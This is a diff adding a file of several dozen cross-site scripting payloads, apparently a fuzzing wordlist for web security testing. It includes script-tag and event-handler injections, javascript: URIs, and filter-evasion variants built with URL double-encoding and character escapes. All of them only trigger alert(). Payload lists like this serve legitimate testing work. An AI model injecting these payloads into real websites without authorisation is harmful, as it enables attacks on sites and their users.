@@ -1,0 +1,46 @@
+<BODY ONLOAD=alert('XSS')>
+"onfocus="alert(1);
+<BODY BACKGROUND="javascript:alert('XSS')">
+<svg/onload=alert('XSS')>
+<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<IMG SRC="javascript:alert('XSS');">
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+</script><script>alert('XSS');</script>
+<svg onload=alert(1)>
+"><svg onload=alert(1)>
+</tag><svg onload=alert(1)>
+"></tag><svg onload=alert(1)>
+"onmouseover=alert(1)//
+"autofocus/onfocus=alert(1)//
+javascript:alert(1)
+data:text/html,<svg onload=alert(1)>
+';alert(1);//
+'-alert(1)-'
+'-alert(1)//
+a=alert,a(1)
+"><img src="x:x" onerror="alert(XSS)">
+"><iframe src="javascript:alert(XSS)">
+<object data="javascript:alert(XSS)">
+'}alert(1)%0A{'
+\'}alert(1);{//
+</script><svg onload=alert(1)>
+'onload=alert(1)><svg/1='
+'>alert(1)</script><script/1='
+*/alert(1)</script><script>/*
+p=<svg/1='&q='onload=alert(1)>
+p=<svg 1='&q='onload='/*&r=*/alert(1)'>
+"><svg onload=alert(1)>.gif
+<img src=1 onerror=alert(1)>
+<iframe src=javascript:alert(1)>
+data:text/html,<img src=1 onerror=alert(1)>
+<script src=data:,alert(1)>
+<Svg OnLoad=alert(1)>
+<Script>alert(1)</Script>
+<svg onload=alert(1)//
+<svg onload="alert(1)"
+<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>
+<script/x>alert(1)</script>
+%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
+%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
+<form><a href="javascript:\u0061lert(1)">X
